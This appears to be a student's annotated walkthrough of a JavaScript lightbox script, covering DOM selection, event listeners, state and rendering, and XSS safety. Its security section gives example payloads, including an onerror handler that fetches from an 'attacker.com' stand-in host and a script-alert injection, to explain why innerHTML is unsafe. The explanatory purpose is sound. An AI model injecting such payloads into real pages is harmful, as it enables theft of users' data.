# Task 2 - Read and Annotate the Code

## 1. The DOM

The DOM elements are located at the top of the file - lines 6-9:

```JavaScript
const lb       = document.querySelector('.lightbox');
const lbImg    = lb.querySelector('.lightbox__img');
const lbCap    = lb.querySelector('.lightbox__caption');
const thumbs   = document.querySelectorAll('.gallery__thumb');
```

`querySelector()` returns a single element, while `querySelectorALL()` returns the collection.
The code uses `lb.querySelectior(...)` for nested elements because `lb` is the lightbox container and focusing the search within `lb` finds only the elements that are inside the lightbox, as opposed to elements with the same name class that are on other parts of the page.

## 2. Event Listeners

Below are the three event listeners:

**Listenter 1: Thumbnail clicks - lines 47-49**

- Element:  `thumbs` (each thumbnail in the collection)
- Event type:  `click`
- Handler:  Opens the lightbox at the index of the clicked thumbnail.
- Code:

```JavaScript
thumbs.forEach((thumb, i) => {
  thumb.addEventListener('click', () => openLightbox(i));
});
```

**Listener 2: Lightbox backdrop click - lines 51-53**

- Element:  `lb` (lightbox container)
- Event type:  `click`
- Handler:  Closes the lightbox if clicked on the backdrop itself.
- Code:

```JavaScript
lb.addEventListener('click', (e) => {
  if (e.target === lb) closeLightbox();
});
```

**Listener 3: Escape key - lines 55-57**

- Element:  `document`
- Event type:  `keydown`
- Handler:  Closes the lightbox if the Escape key is pressed and the lightbox is open.
- Code:

```JavaScript
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && state.isOpen) closeLightbox();
});
```

**Event Delegation:**
The lightbox backdrop listener - Listener 2 - uses event delegation by checking `e.target === lb` to handle multiple potential click scenarios within one listener.  It distinguishes between clicks on the backdrop vs. clicks inside the lightbox content.

## 3. State and the Render Pattern

**State Objects and Fields - lines 12-20:**

```JavaScript
const state = {
  isOpen: false,
  index: 0,
  images: [
    { src: 'images/sample-1.svg', caption: 'Sample image one — replace with your own' },
    { src: 'images/sample-2.svg', caption: 'Sample image two — a second photo' },
    { src: 'images/sample-3.svg', caption: 'Sample image three — a third' },
  ],
};
```

The state fields are:

- `isOpen`: determines whether the lightbox overlay is currently visible.
- `index`: determines which image in the array is currently displayed.
- `images`: contains an arrary of objects, each containing a `src` (image path) and `caption` (text to display).

When a user clicks a thumbnail:

1. The click listener filres on the thumbnail - lines 47-49.
2. Listener calls `openLightbox(i)`.
3. Mutator sets `state.isOpen = true` and `state.index = i` - lines 24-25.
4. Mutator calls `render()` on line 26.
5. `render()` gets the current image from `state.images[state.index]`.
6. `render()` sets the image `src` with `setAttribute()` on line 38.
7. `render()` sets the caption text with `textContent` on line 39.
8. `render()` adds the `open` class on line 40.
9. User sees the lightbox appear.

The mutators are `openLightbox()` and `closeLightbox()`.  They are the only fuctions that change state and both call `render()` right after.  `render()` itself is defined at lines 35-44 and gets called from line 26 (`openLightbox`), line 31 (`closeLightbox`), and indirectly from line 56 when the Escape key listener calls `closeLightbox()`.

Updating state without calling `render()`, wouldn't change anything on the page.  State would be updated internally, but the DOM wouldn't reflect it, so the user would see the old page even though the app thinks things changed.

## 4. Security

The two XSS-safe lines in `render()` are lines 38 and 39:

```JavaScript
lbImg.setAttribute('src', src);
lbCap.textContent = caption;
```

Both are safe because they don't parse HTML.  `setAttribute()` just sets an attriubte value, and `textContent` treats the input as literal text, it won't run any JavaScript or HTML tags.

If line 38 used `innerHTML` instead, an attacker could put malicious HTML in the `src` field like `<img src=x onerror="fetch('attacker.com/steal')">`. When the browser parsed it as HTML, the JavaScript would run.

If line 39 used `innerHTML` instead, an attacker could put something like `<script>alert('hacked')</script>` in the caption, and it would execute when the page loads.  Or they could use `<img, onerror="...">` to run code when the image fails to load.

The type of attack is called XSS (Cross-Site Scripting). It occurs when untrusted data gets parsed as code instead of as plain text.

## 5. Patterns

In `lightBox.js`, I see the following patterns:

1. State+render pattern:  Lines 12-20, Lines 23-32, Lines 35-44.
2. Event listener pattern:  Lines 47-49, Lines 51-53, Lines 55-57.
3. Event delegation pattern:  Lines 51-53.
4. Module scope pattern:  Lines 5-9, Lines 12-20.

Pattern not present in `lightBox.js`:

- Debounce/throttle:  No rate-limiting or delayed execution in this code. 

